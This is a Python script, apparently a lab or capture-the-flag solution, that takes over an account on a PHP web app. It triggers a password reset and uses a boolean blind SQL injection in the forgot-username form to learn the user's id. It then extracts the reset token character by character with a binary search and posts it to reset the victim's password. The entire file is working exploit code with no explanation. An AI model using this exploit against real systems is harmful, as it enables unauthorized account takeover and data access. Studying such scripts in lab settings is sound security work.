import requests

target = "http://localhost:8000"
user = "user1"
new_password = "user1newpw"

requests.post(f"{target}/forgotpassword.php", data={"username": user})

def oracle(query):
    r = requests.post(
        f"{target}/forgotusername.php",
        data={"username": f"{query};--"}
    )
    return "User exists!" in r.text

uid = 0
while not oracle(f"{user}' and uid={uid}"):
    uid += 1
print(f"[*] UID: {uid}")

token = ""
for i in range(32):
    low, high = 48, 122
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"{user}' and (select ascii(substring(token,{i+1},1)) from tokens where uid={uid} order by tid limit 1)>'{mid}'"):
            low = mid + 1
        elif oracle(f"{user}' and (select ascii(substring(token,{i+1},1)) from tokens where uid={uid} order by tid limit 1)<'{mid}'"):
            high = mid - 1
        else:
            token += chr(mid)
            print(chr(mid), end='', flush=True)
            break
print()

r = requests.post(f"{target}/resetpassword.php", data={"token": token, "password1": new_password, "password2": new_password})
print(f"[+] Done: {r.text.strip()}")
